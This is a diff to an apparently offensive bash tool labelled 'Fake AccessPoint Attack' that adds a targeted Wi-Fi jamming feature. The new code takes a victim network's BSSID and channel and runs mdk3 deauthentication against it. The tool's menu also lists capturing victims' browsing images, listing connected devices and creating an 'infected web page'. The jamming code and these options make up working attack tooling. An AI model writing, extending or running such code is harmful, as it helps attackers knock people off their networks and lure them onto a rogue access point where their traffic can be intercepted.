@@ -34,7 +34,7 @@ ${Red}  / /\ / _ \/ _  |/ _  | | | | | ${White}|/|${Yellow} \ \| |/ _  |  _ \ / 
 ${Red} / /_//  __/ (_| | (_| | | |_| | ${White}|\|${Yellow} _\ \ | (_| | | | | (_| | \__ |
 ${Red}/___ / \___|\__ _|\__ _|_|\__  | ${White}|/|${Yellow} \__/_|\__  |_| |_|\__ _|_|___/
 ${Red}                          |___/           ${Yellow} |___/
-${Yellow}   Fake AccessPoint Attack ${Blue}Version 2.2 Beta ${White}Created By${Red}:${Yellow}0V3rK!113R
+${Yellow}   Fake AccessPoint Attack ${Blue}Version 2.5 Beta ${White}Created By${Red}:${Yellow}0V3rK!113R
 
 	${Color_Off}"""
 }
@@ -52,9 +52,16 @@ function normal_interrupt {
 
 function hard_interrupt {
 
-	echo -e "\n[${Red}x$Color_Off]Kill monitor mode"
+	if ps -A | grep -q mdk3; then
+		echo -e "\n[${Red}-${Color_Off}]Stop jamming client wifi.."
+		killall mdk3 &> /dev/null
+		sleep 3
+	fi
+	
+	echo -e "[${Red}x$Color_Off]Kill monitor mode"
 	STOP_MONITOR=$(airmon-ng stop $MON_INTERFACE > /dev/null)
 
+	
 	echo -e "[${Red}x$Color_Off]turnning off all interfaces"
 	BROADCAST_INTERFACE_DOWN=$(ifconfig $BROADCAST_INTERFACE down > /dev/null)
 	ONLINE_INTERFACE_DOWN=$(ifconfig $ONLINE_INTERFACE down > /dev/null)
@@ -86,6 +93,7 @@ function hard_interrupt {
 	fi
 	a2dismod ssl > /dev/null
 	/etc/init.d/apache2 stop
+
 
 	echo -e "[${Red}x${Color_Off}]Clearing the files"
 	WIPE_DNSMASQ=$(echo 0 > /etc/dnsmasq.conf)
@@ -532,16 +540,64 @@ function infected_index {
 
 }
 
+function jamming_attack_start {
+
+	
+	echo -e "\n[${Blue}?${Color_Off}]Enter wifi BSSID"
+	header
+	read WIFI_BSSID
+	while [[ -z WIFI_BSSID ]]; do
+		echo -e "[${Red}x${Color_Off}]Invaild BSSID\n"
+		echo -e "\n[${Blue}?${Color_Off}]Enter wifi BSSID"
+		header
+		read WIFI_BSSID
+	done
+	echo $WIFI_BSSID > .target_bssid
+
+	echo -e "\n[${Blue}?${Color_Off}]Enter wifi channel"
+	header
+	read WIFI_CHANNEL
+	
+	while [[ -z WIFI_CHANNEL ]]; do
+		echo -e "[${Red}x${Color_Off}]Invaild BSSID\n"
+		echo -e "\n[${Blue}?${Color_Off}]Enter wifi channel"
+		header
+		read WIFI_CHANNEL
+	done
+
+	mdk3 $MON_INTERFACE d -b .target_bssid -c $WIFI_CHANNEL > /dev/null &
+
+	if [ $? != 0 ]
+		then echo -e "[${Red}x${Color_Off}]Something went wrong!"
+	else
+		echo -e "[${Green}+${Color_Off}]Jamming client begins!"
+	fi
+
+
+}
+
+function jamming_attack_stop {
+	
+	if ps -A | grep -q mdk3; then
+		echo -e "[${Red}-${Color_Off}]Stop jamming client wifi.."
+		killall mdk3 &> /dev/null
+	else
+		echo -e "[${Red}x${Color_Off}]Jamming already stopped!"
+	fi
+}
+
 function attack_options {
 	HOST_IP=($(ip route get 8.8.8.8 | awk '{print $NF; exit }'))
 	while [[ true ]]; do
 		clear
 		banner
-		RULES_EXIST=$(iptables -L FORWARD | grep REJECT | grep tcp  > /dev/null)
-		if [ $? = 0 ]
-			then echo -e "\n${Red}●${Color_Off} Connection Status - Offline\n"
+		if iptables -L FORWARD | grep REJECT | grep tcp  > /dev/null;then
+			echo -e "\n${Red}●${Color_Off} Connection Status - Offline\n"
 		else
 			echo -e "\n${Green}●${Color_Off} Connection Status - Online\n"
+		fi
+		if ps -A | grep -q mdk3; then
+			echo -e "${Green}(${BRed}*${Purple}/${BRed}*${Green})${Color_Off}Jamming is activated\n"
 		fi
 		echo -e "\n${Yellow}[${Red}1${Yellow}]${Color_Off}Get Browsing Images"
 		echo -e "${Yellow}[${Red}2${Yellow}]${Color_Off}Make login required ${Red}[Still under developing]"
@@ -551,6 +607,8 @@ function attack_options {
 		echo -e "${Yellow}[${Red}6${Yellow}]${Color_Off}Online Connection"
 		echo -e "${Yellow}[${Red}7${Yellow}]${Color_Off}Show the connected devices"
 		echo -e "${Yellow}[${Red}8${Yellow}]${Color_Off}Create infected web page"
+		echo -e "${Yellow}[${Red}9${Yellow}]${Color_Off}Jamming targeted wifi ${Green}Start${Color_Off}"
+		echo -e "${Yellow}[${Red}10${Yellow}]${Color_Off}Jamming targeted wifi ${Red}Stop${Color_Off}"
 		echo -e "\n[${Yellow}!${Color_Off}]${Red}Press Ctrl+C to kill the broadcast of AP${Color_Off}"
 		header
 		read ATTACKOPTION
@@ -613,6 +671,14 @@ function attack_options {
 
 		elif [ $ATTACKOPTION = 8 ]
 			then infected_index
+
+		elif [ $ATTACKOPTION = 9 ]
+			then jamming_attack_start
+			sleep 4
+
+		elif [ $ATTACKOPTION = 10 ]
+			then jamming_attack_stop
+			sleep 4
 
 		else
 			echo -e "[${Red}x${Color_Off}]False Input!"
